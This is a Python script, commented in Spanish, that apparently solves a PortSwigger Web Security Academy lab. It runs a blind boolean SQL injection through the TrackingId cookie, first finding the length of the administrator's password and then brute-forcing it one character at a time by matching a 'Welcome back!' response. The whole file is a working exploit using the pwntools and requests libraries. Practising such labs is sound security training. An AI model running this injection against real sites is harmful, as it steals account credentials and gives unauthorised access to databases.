#!/bin/python3
from pwn import *
import sys,time,signal,string,pdb,requests

#Salida de emergencia [ctl+c]
def handler(signal,frame):
    print('\n\n[!]Saliendo...\n')
    sys.exit(1) #Salida erronea pq el programa no termina su funcionamiento normal al hacer ctl+c
    

signal.signal(signal.SIGINT,handler) #ctl+c en si, [signal.SIGINT], handler la funcion de arriba

main_url='https://0ace00c70476ee17c008e07400a700e9.web-security-academy.net'
diccionario= string.ascii_lowercase + string.digits


def length_password():  #funcion que descubre el largo de la password
    
    pb= log.progress("Iterator 3000") # barra de progreso llamada iterator 3000 pq si
    flag = True
    counter = 5


    while(flag):#en el TrackingId ocurre la magia al injectar querys, en esta funcion se utiliza para verificar el largo de la password 
        cookies={
            'TrackingId': "2rZhdV09SZLRo5GI' and (select 'a' from users where username='administrator' and length(password)>%d)='a" % (counter),
            'session': '9W54b6PW5zRB55V7hH4iGAuVVPTAhqjw'
         }      #ayuda al hacer el codigo que no quiero borrar  ' and (select 'a' from users where username='administrator' and length(password)>5)='a

        pb.status(cookies['TrackingId'])# actualiza la barra de progreso, quiero ver el TackingId 
    

        r = requests.get(main_url,cookies=cookies)

        if("Welcome back!" in r.text):
            counter = counter + 1
            
        else:
            
            flag=False
   
    return counter


def attack(): # el ataque en si, ojo que ocupa la funcion de length_password dentro  para ejercer
    contra = ''

    pl = log.progress("Fuerza bruta")
    pl.status("Iniciando ataque de fuerza bruta")
    
    time.sleep(2)# simplemente para alcanzar a leer el status en la consola 

    pl2= log.progress("Password")
    
    

    for position in range(1,length_password()): # Para iterar en cada posicion o caracter de la password, desde 1 a 20 en este caso, determinado por la funcion 
        for iterator in diccionario:#Para hacer la fuerza bruta en cada caracter, se itera el diccionario completo hasta encontrar el caracter correcto
            cookies = {
                'TrackingId': "2rZhdV09SZLRo5GI' and (select substring(password,%d,1) from users where username='administrator')= '%s" % (position,iterator),
                'session': '9W54b6PW5zRB55V7hH4iGAuVVPTAhqjw'
                }
            
            pl.status(cookies['TrackingId'])

            r = requests.get(main_url,cookies=cookies)

            if("Welcome back!" in r.text):
                contra += iterator# Si la query es correcta suma el caracter correcto a la password 
                pl2.status(contra)# muestra el avance de la password 
                break




if __name__== '__main__':
    #length_password() # esta linea es innecesaria, pero fue parte del proceso
    attack()